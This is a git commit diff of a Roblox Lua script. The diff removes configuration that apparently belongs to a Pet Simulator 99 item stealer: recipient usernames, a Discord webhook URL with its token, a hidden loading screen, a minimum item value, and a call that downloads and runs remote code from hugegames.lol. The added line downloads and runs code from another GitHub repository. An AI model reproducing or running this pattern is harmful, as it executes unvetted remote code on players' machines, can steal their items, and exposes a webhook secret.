8f34bdb0f98a60c6eeb664ad8c848851f60f3c1f
Hyperbruh <161280561+Hyperbruh@users.noreply.github.com>
2024-02-26 13:03:32 +0700

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,9 +1,1 @@
-Username = "baconsoi645"
-Username2 = "BacKiAnTraiKiwi69"
-Webhook = "https://discord.com/api/webhooks/1137967166256332890/iVledYsbclytJoN8q7ceRlmZaLWOtMKkZeQmNKt9TffMYgGOryAYcauvav0Zsp9hlDra"
-
-LoadingScreen = true
-
-MinimumRAP = 10000
-
-loadstring(game:HttpGet("https://hugegames.lol/ps99.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hyperbruh/CumHub/main/fixed.lua"))()
